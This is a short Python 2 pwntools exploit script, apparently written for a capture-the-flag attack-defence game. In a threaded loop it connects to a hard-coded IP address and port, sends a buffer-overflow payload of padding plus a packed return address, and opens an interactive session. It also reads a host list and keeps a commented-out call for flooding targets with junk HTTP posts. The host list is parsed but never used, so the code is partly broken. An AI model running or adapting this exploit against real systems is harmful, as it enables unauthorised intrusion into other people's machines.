#!/usr/bin/env python 

from trash import trash
from http import http
import time
from pwn import *
import base64

import threading


def send():
    #here are your targets
    while True:
        for host in hosts:
            for url in urls:
                ip,port = host[:-1].split(":")
                try:
                    p = remote("118.190.77.161", 10080)

                    payload="A"*20+p32(0x40106098)
                    p.sendline(payload)

                    p.interactive()
                    #tmp = http('post',ip,int(port),url,trash('aaa','bbb'),headers)
                except Exception,e:
                    print e
        time.sleep(1)

headers = {}
hosts = open("host_web.txt").readlines()
urls = ['/index.php']
for i in xrange(0,5):
    print "start a new round of dirty"
    print 'thread %s is running...' % threading.current_thread().name
    t = threading.Thread(target=send, name='LoopThread')
    t.start()
    t.join()
    print 'thread %s ended.' % threading.current_thread().name
